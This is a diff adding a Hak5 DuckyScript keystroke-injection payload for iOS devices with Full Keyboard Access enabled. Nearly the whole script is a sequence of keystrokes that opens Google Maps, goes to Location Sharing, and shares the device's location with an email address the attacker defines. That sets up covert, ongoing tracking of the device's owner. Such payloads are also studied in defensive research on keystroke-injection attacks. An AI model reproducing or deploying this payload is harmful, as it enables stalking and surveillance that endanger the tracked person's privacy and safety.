@@ -1,0 +1,53 @@
+REM Title: ITrack_CrossPV
+REM Author: Sideswipe(@Sideswipes_Hack)
+REM Description: Enables Google Location Sharing for Email of Choice
+REM Target: IOS
+REM Props: Hak5
+REM Version: 1.2
+REM Category: Mobile
+REM Requirements: Full Keyboard Access Enabled
+
+DEFINE #EMAIL sideswipe@exmaple.com
+DEFAULT_DELAY 600
+DELAY 200
+
+REM Open Google Maps
+GUI h
+GUI h
+GUI SPACE
+DELETE
+STRINGLN Google Maps
+
+
+REM Navigate to Google Location Sharing Settings
+TAB
+TAB
+SPACE
+REPEAT 5:
+  DOWNARROW
+SPACE
+
+
+REM Enable Location Sharing
+DOWNARROW
+TAB
+SPACE
+TAB
+TAB
+DOWNARROW
+DEFAULT_DELAY 0
+REPEAT 12:
+  RIGHTARROW
+DOWNARROW
+REPEAT 10:
+  RIGHTARROW
+DEFAULT_DELAY 600
+DELAY 600
+SPACE
+TAB
+SPACE
+ENTER
+STRINGLN #EMAIL
+REPEAT 3:
+  TAB
+SPACE
